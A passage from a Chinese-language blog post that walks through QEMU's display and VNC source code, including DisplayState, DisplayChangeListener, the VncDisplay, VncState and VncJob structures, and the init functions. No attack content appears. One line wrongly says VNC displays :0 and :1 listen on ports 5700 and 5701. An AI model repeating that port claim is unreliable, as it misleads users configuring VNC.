最初指的就是一个设备的控制台，<em>包含了显示设备与基本输入设备</em> ，与 terminal 不同，console 通常是机器自带的，而 terminal 则往往指的是需要我们通过串口进行连接的外部设备<br>不过随着时代的发展，现在对于 console 与 terminal 之间概念的定义区别也逐渐趋于模糊，现在的机器大都不再有实体的 console，而采用软件模拟的方式，例如在 Linux 中定义了 6 个 virtual terminal（可以使用 <code>ctrl + f1 ~ f6</code> 进行切换），而当我们向 <code>/dev/console</code> 输入时，则会输出到当前的 virtual terminal 上；而在一些其他的类 UNIX 系统中，console 则往往被固定为第一个 virtual terminal</p></blockquote><h3 id="II、DisplayState-显示设备总状态">II、DisplayState - 显示设备总状态</h3><p>在 Qemu 当中使用一个 <code>DisplayState</code> 表示显示设备的总状态，该结构体定义于 <code>ui/console.c</code> 中,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayState</span> &#123;</span><br>    QEMUTimer *gui_timer;   <span class="hljs-comment">// 对应更新的 timer</span><br>    <span class="hljs-type">uint64_t</span> last_update;   <span class="hljs-comment">// 上次更新时间</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">bool</span> refreshing;<br>    <span class="hljs-type">bool</span> have_gfx;          <span class="hljs-comment">// 是否有图形化显示</span><br>    <span class="hljs-type">bool</span> have_text;         <span class="hljs-comment">// 是否有纯文本显示</span><br><br>    QLIST_HEAD(, DisplayChangeListener) listeners;  <span class="hljs-comment">// 各个 Display 的 Listener 的链表</span><br>&#125;;<br><br><span class="hljs-type">static</span> DisplayState *display_state; <span class="hljs-comment">// 全局的 DisplayState</span><br></code></pre></td></tr></table></figure><p>通常而言，一个 DisplayState 可以对应着多个 QemuConsole，因为其可以对应着多个 VGA 设备，因此相应地其可以有着多个 <code>DisplayChangeListener</code> 来监视多个 Display 设备的更改，多个 <code>DisplayChangeListener</code> 之间连成一个链表</p><h3 id="III、DisplayChangeListener-监视单个显示设备的更改">III、DisplayChangeListener - 监视单个显示设备的更改</h3><p><code>DisplayChangeListener</code> 结构体用于<strong>监视单个显示设备的更改</strong>并进行相关操作，因此一个 DisplayChangeListener 应当与一个特定的 QemuConsole 相关联</p><p>通常而言一个 QemuConsole 可以有着多个 DisplayChangeListener（例如一个 QemuConsole 可以对应有着一个 VNC 的 DCL + 一个本地虚拟终端的 DCL）</p><p>该结构体定义于 <code>include/ui/console.h</code> 中,如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">DisplayChangeListener</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span> update_interval;<br>    <span class="hljs-type">const</span> DisplayChangeListenerOps *ops;<br>    DisplayState *ds;<br>    QemuConsole *con;<br><br>    QLIST_ENTRY(DisplayChangeListener) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>其成员 <code>ops</code> 为一个 <code>DisplayChangeListenerOps</code> 函数表，该函数表中包含大量的函数指针，用以进行显示相关的操作（例如 <code>dpy_refresh</code> 指针用于刷新显示， <code>gfx_hw_update</code> 指针用于进行显卡硬件相关更新，我们在后面会看到这一点）</p><h2 id="一、init-displaystate-遍历所有的-QemuConsole-并加入-qom-tree，初始化字符型-console">一、init_displaystate() - 遍历所有的 QemuConsole 并加入 qom tree，初始化字符型 console</h2><p><code>init_displaystate()</code> 主要用于对 QemuConsole 进行初始化的工作，该函数定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 由 main() 调用, 在创建 QemuConsoles 之后</span><br><span class="hljs-comment"> * 在初始化 ui (sdl/vnc/...) 之前.</span><br><span class="hljs-comment"> */</span><br>DisplayState *<span class="hljs-title function_">init_displaystate</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    gchar *name;<br>    QemuConsole *con;<br><br>    get_alloc_displaystate();<br>    QTAILQ_FOREACH(con, &amp;consoles, next) &#123;<br>        <span class="hljs-keyword">if</span> (con-&gt;console_type != GRAPHIC_CONSOLE &amp;&amp;<br>            con-&gt;ds == <span class="hljs-literal">NULL</span>) &#123;<br>            text_console_do_init(con-&gt;chr, display_state);<br>        &#125;<br><br>        <span class="hljs-comment">/* 在这里连接上 qom tree (而不在 new_console()), </span><br><span class="hljs-comment">         * 在所有的 QemuConsoles 都被创建后，其顺序与序号</span><br><span class="hljs-comment">         * 都将不再更改 */</span><br>        name = g_strdup_printf(<span class="hljs-string">&quot;console[%d]&quot;</span>, con-&gt;index);<br>        object_property_add_child(container_get(object_get_root(), <span class="hljs-string">&quot;/backend&quot;</span>),<br>                                  name, OBJECT(con));<br>        g_free(name);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> display_state;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要是遍历全局的 QemuConsole 链表并将其加入到 qom tree 中，若非图形化的 console 则还会调用 <code>text_console_do_init()</code> 进行初始化工作，主要是将其设为标准的 <code>80*24</code> 的字符显示设备，并将其 <code>hw_ops</code> 设为 <code>text_console_ops</code>，其 <code>hw</code> 则指向 QemuConsole 自身</p><h2 id="二、qemu-display-init-调用对应类型-QemuDisplay-的-init-函数进行初始化">二、qemu_display_init() - 调用对应类型 QemuDisplay 的 init 函数进行初始化</h2><p>该函数同样定义于 <code>ui/console.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_init</span><span class="hljs-params">(DisplayState *ds, DisplayOptions *opts)</span><br>&#123;<br>    assert(opts-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    <span class="hljs-keyword">if</span> (opts-&gt;type == DISPLAY_TYPE_NONE) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    assert(dpys[opts-&gt;type] != <span class="hljs-literal">NULL</span>);<br>    dpys[opts-&gt;type]-&gt;init(ds, opts);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 dpys 是一个 <code>QemuDisplay</code> 类型的全局数组，定义于 <code>ui/console.c</code> 中，表示 Qemu 所支持的所有显示类型，我们可以通过 <code>qemu_display_register()</code> 将显示类型注册到该数组中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> QemuDisplay *dpys[DISPLAY_TYPE__MAX];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_register</span><span class="hljs-params">(QemuDisplay *ui)</span><br>&#123;<br>    assert(ui-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    dpys[ui-&gt;type] = ui;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>QemuDisplay</code> 结构体定义于 <code>ui/console.h</code> 中，表示 Qemu 所支持的单个显示类型，主要就是类型 + 初始化的函数指针，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuDisplay</span> &#123;</span><br>    DisplayType type;<br>    <span class="hljs-type">void</span> (*early_init)(DisplayOptions *opts);<br>    <span class="hljs-type">void</span> (*init)(DisplayState *ds, DisplayOptions *opts);<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>不过经笔者调试通常情况下不特定指定的话都会是 <code>DISPLAY_TYPE_NONE</code></p></blockquote><h1>0x02. vnc_init_func() - 初始化单个 VNC Server</h1><p>在一个 Qemu 实例当中，我们通常只会使用到一个 VGA 设备（也可以多个），不过我们可以同时启动多个 VNC Server，例如我们可以附加启动参数 <code>-vnc yourip:0 -vnc yourip:1</code>，此时 Qemu 就会在 5700 与 5701 端口上启动两个 VNC 服务器，而每个 VNC Server 的启动都是通过 <code>vnc_init_func()</code> 来完成的</p><p>当我们只有一个 VGA 设备输出时，其输出会被同时更新给多个 VNC Client，此时多个 VNC Client 所获取到的画面是相同的</p><p><code>vnc_init_func()</code> 定义于 <code>ui/vnc.c</code> 中，比较简短，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vnc_init_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, QemuOpts *opts, Error **errp)</span><br>&#123;<br>    Error *local_err = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *id = (<span class="hljs-type">char</span> *)qemu_opts_id(opts);<br><br>    assert(id);<br>    vnc_display_init(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    vnc_display_open(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err != <span class="hljs-literal">NULL</span>) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>主要做了两件事：</p><ul><li><code>vnc_display_init()</code>：初始化一个 <code>VncDisplay</code> 实例</li><li><code>vnc_display_open()</code>：启动一个 VNC Server</li></ul><p><code>vnc_display_open()</code> 主要就是单纯的创建一个普通的 server，以及一些和 VNC 协议具体细节相关的部分，故我们接下来主要分析 <code>vnc_display_init()</code></p><h2 id="〇、VNC-相关结构体">〇、VNC 相关结构体</h2><h3 id="I、VncDisplay-单个-VNC-Server-实例">I、VncDisplay - 单个 VNC Server 实例</h3><p>该结构体定义于 <code>ui/vnc.h</code> 中，表示单个 VNC Server 实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncDisplay</span></span><br><span class="hljs-class">&#123;</span><br>    QTAILQ_HEAD(, VncState) clients;<br>    <span class="hljs-type">int</span> num_connecting;<br>    <span class="hljs-type">int</span> num_shared;<br>    <span class="hljs-type">int</span> num_exclusive;<br>    <span class="hljs-type">int</span> connections_limit;<br>    VncSharePolicy share_policy;<br>    QIONetListener *listener;<br>    QIONetListener *wslistener;<br>    DisplaySurface *ds;<br>    DisplayChangeListener dcl;<br>    <span class="hljs-type">kbd_layout_t</span> *kbd_layout;<br>    <span class="hljs-type">int</span> lock_key_sync;<br>    QEMUPutLEDEntry *led;<br>    <span class="hljs-type">int</span> ledstate;<br>    QKbdState *kbd;<br>    QemuMutex mutex;<br><br>    QEMUCursor *cursor;<br>    <span class="hljs-type">int</span> cursor_msize;<br>    <span class="hljs-type">uint8_t</span> *cursor_mask;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> <span class="hljs-title">guest</span>;</span>   <span class="hljs-comment">/* guest visible surface (aka ds-&gt;surface) */</span><br>    <span class="hljs-type">pixman_image_t</span> *server;    <span class="hljs-comment">/* vnc server surface */</span><br>    <span class="hljs-type">int</span> true_width; <span class="hljs-comment">/* server surface width before rounding up */</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id;<br>    QTAILQ_ENTRY(VncDisplay) next;<br>    <span class="hljs-type">bool</span> is_unix;<br>    <span class="hljs-type">char</span> *password;<br>    <span class="hljs-type">time_t</span> expires;<br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">int</span> ws_auth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">int</span> ws_subauth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">bool</span> lossy;<br>    <span class="hljs-type">bool</span> non_adaptive;<br>    <span class="hljs-type">bool</span> power_control;<br>    QCryptoTLSCreds *tlscreds;<br>    QAuthZ *tlsauthz;<br>    <span class="hljs-type">char</span> *tlsauthzid;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncDisplaySASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    AudioState *audio_state;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注这几个成员变量：</p><ul><li><code>clients</code>：连接到该服务器上的所有客户端，每个客户端为一个 <code>VncClient</code> 实例，多个 <code>VncClient</code> 实例间形成一个链表</li><li><code>ds</code>：</li><li><code>dcl</code>：该 VNC Server 所监听的 QemuConsole 的监听器，当对应的 QemuConsole 发生更改时便会调用 <code>dcl-&gt;ops</code> 中对应函数指针</li><li><code>next</code>：多个 VncDisplay 之间互相连接形成一个链表</li></ul><p>同时存在着一个全局变量 <code>vnc_displays</code>，Qemu 中所有的 VncDisplay 都挂载在该链表上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, VncDisplay)</span> vnc_displays =<br>    QTAILQ_HEAD_INITIALIZER(vnc_displays);<br></code></pre></td></tr></table></figure><h3 id="II、VncState-单个-VNC-连接（VNC-Client）">II、VncState - 单个 VNC 连接（VNC Client）</h3><p>该结构体定义于 <code>ui/vnc.h</code> 中，表示连接到特定 VNC Server 上的单个 VNC Client 实例，其中包含客户端的各种信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncState</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> magic;<br>    QIOChannelSocket *sioc; <span class="hljs-comment">/* The underlying socket */</span><br>    QIOChannel *ioc; <span class="hljs-comment">/* The channel currently used for I/O */</span><br>    guint ioc_tag;<br>    gboolean disconnecting;<br><br>    DECLARE_BITMAP(dirty[VNC_MAX_HEIGHT], VNC_DIRTY_BITS);<br>    <span class="hljs-type">uint8_t</span> **lossy_rect; <span class="hljs-comment">/* Not an Array to avoid costly memcpy in</span><br><span class="hljs-comment">                           * vnc-jobs-async.c */</span><br><br>    VncDisplay *vd;<br>    VncStateUpdate update; <span class="hljs-comment">/* Most recent pending request from client */</span><br>    VncStateUpdate job_update; <span class="hljs-comment">/* Currently processed by job thread */</span><br>    <span class="hljs-type">int</span> has_dirty;<br>    <span class="hljs-type">uint32_t</span> features;<br>    <span class="hljs-type">int</span> absolute;<br>    <span class="hljs-type">int</span> last_x;<br>    <span class="hljs-type">int</span> last_y;<br>    <span class="hljs-type">uint32_t</span> last_bmask;<br>    <span class="hljs-type">size_t</span> client_width; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    <span class="hljs-type">size_t</span> client_height; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    VncShareMode share_mode;<br><br>    <span class="hljs-type">uint32_t</span> vnc_encoding;<br><br>    <span class="hljs-type">int</span> major;<br>    <span class="hljs-type">int</span> minor;<br><br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">char</span> challenge[VNC_AUTH_CHALLENGE_SIZE];<br>    QCryptoTLSSession *tls; <span class="hljs-comment">/* Borrowed pointer from channel, don&#x27;t free */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncStateSASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">bool</span> encode_ws;<br>    <span class="hljs-type">bool</span> websocket;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    VncClientInfo *info;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* Job thread bottom half has put data for a forced update</span><br><span class="hljs-comment">     * into the output buffer. This offset points to the end of</span><br><span class="hljs-comment">     * the update data in the output buffer. This lets us determine</span><br><span class="hljs-comment">     * when a force update is fully sent to the client, allowing</span><br><span class="hljs-comment">     * us to process further forced updates. */</span><br>    <span class="hljs-type">size_t</span> force_update_offset;<br>    <span class="hljs-comment">/* We allow multiple incremental updates or audio capture</span><br><span class="hljs-comment">     * samples to be queued in output buffer, provided the</span><br><span class="hljs-comment">     * buffer size doesn&#x27;t exceed this threshold. The value</span><br><span class="hljs-comment">     * is calculating dynamically based on framebuffer size</span><br><span class="hljs-comment">     * and audio sample settings in vnc_update_throttle_offset() */</span><br>    <span class="hljs-type">size_t</span> throttle_output_offset;<br>    Buffer output;<br>    Buffer input;<br>    <span class="hljs-comment">/* current output mode information */</span><br>    VncWritePixels *write_pixels;<br>    PixelFormat client_pf;<br>    <span class="hljs-type">pixman_format_code_t</span> client_format;<br>    <span class="hljs-type">bool</span> client_be;<br><br>    CaptureVoiceOut *audio_cap;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">audsettings</span> <span class="hljs-title">as</span>;</span><br><br>    VncReadEvent *read_handler;<br>    <span class="hljs-type">size_t</span> read_handler_expect;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">abort</span>;<br>    QemuMutex output_mutex;<br>    QEMUBH *bh;<br>    Buffer jobs_buffer;<br><br>    <span class="hljs-comment">/* Encoding specific, if you add something here, don&#x27;t forget to</span><br><span class="hljs-comment">     *  update vnc_async_encoding_start()</span><br><span class="hljs-comment">     */</span><br>    VncTight *tight;<br>    VncZlib zlib;<br>    VncHextile hextile;<br>    VncZrle *zrle;<br>    VncZywrle zywrle;<br><br>    Notifier mouse_mode_notifier;<br><br>    QemuClipboardPeer cbpeer;<br>    QemuClipboardInfo *cbinfo;<br>    <span class="hljs-type">uint32_t</span> cbpending;<br><br>    QTAILQ_ENTRY(VncState) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在同一个 VncDisplay （VNC Server）下的所有 VncState（VNC Client）连接成一个链表</p><h3 id="III、VncJob-单个-VNC-连接单次需要更新的图像信息">III、VncJob - 单个 VNC 连接单次需要更新的图像信息</h3><p>VncJob 结构体用来表示单个 VNC 连接（VncState）单次需要更新的图像信息，定义于 <code>ui/vnc.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJob</span></span><br><span class="hljs-class">&#123;</span><br>    VncState *vs;<br><br>    QLIST_HEAD(, VncRectEntry) rectangles;<br>    QTAILQ_ENTRY(VncJob) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在单次的图像更新当中，单个矩形区域具体的的更新信息使用 <code>VncRectEntry</code> 结构体表示，单个 VncJob 中可以有多个 VncRectEntry，他们之间形成一个单向链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> w;<br>    <span class="hljs-type">int</span> h;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRectEntry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span> <span class="hljs-title">rect</span>;</span><br>    QLIST_ENTRY(VncRectEntry) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>多个 VncJob 之间也构成一个单向链表，最终挂载到一个 <code>VncJobQueue</code> 结构体上，该结构体定义于 <code>ui/vnc-jobs.c</code> 中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> &#123;</span><br>    QemuCond cond;<br>    QemuMutex mutex;<br>    QemuThread thread;<br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">exit</span>;<br>    QTAILQ_HEAD(, VncJob) jobs;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> <span class="hljs-title">VncJobQueue</span>;</span><br></code></pre></td></tr></table></figure><p>同时我们存在着一个全局的 VncJobQueue，默认情况下我们会将 VncJob 挂载到上面，同时 vnc worker thread（负责将图像信息发送给 client 的线程）也是主要依赖于这个全局的 queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We use a single global queue, but most of the functions are</span><br><span class="hljs-comment"> * already reentrant, so we can easily add more than one encoding thread</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> VncJobQueue *<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><h2 id="一、vnc-display-init">一、vnc_display_init()</h2><p>该函数主要作用便是初始化一个 <code>VncDisplay</code> 结构体，定义于 <code>ui/vnc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_display_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *id, Error **errp)</span><br>&#123;<br>    VncDisplay *vd;<br><br>    <span class="hljs-keyword">if</span> (vnc_display_find(id) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    vd = g_malloc0(<span class="hljs-keyword">sizeof</span>(*vd));<br><br>    vd-&gt;id = strdup(id);<br>    QTAILQ_INSERT_TAIL(&amp;vnc_displays, vd, next);  <span class="hljs-comment">// 加入到全局链表中</span><br><br>    QTAILQ_INIT(&amp;vd-&gt;clients);<br>    vd-&gt;expires = TIME_MAX;<br><br>    <span class="hljs-keyword">if</span> (keyboard_layout) &#123;  <span class="hljs-comment">// 初始化键盘布局</span><br>        trace_vnc_key_map_init(keyboard_layout);<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym,<br>                                              keyboard_layout, errp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        vd-&gt;kbd_layout = init_keyboard_layout(name2keysym, <span class="hljs-string">&quot;en-us&quot;</span>, errp);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!vd-&gt;kbd_layout) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    vd-&gt;share_policy = VNC_SHARE_POLICY_ALLOW_EXCLUSIVE;<br>    vd-&gt;connections_limit = <span class="hljs-number">32</span>;<br><br>    qemu_mutex_init(&amp;vd-&gt;mutex);<br>    vnc_start_worker_thread();  <span class="hljs-comment">// 启动 VNC 的 worker 线程</span><br><br>    vd-&gt;dcl.ops = &amp;dcl_ops; <span class="hljs-comment">// 设置 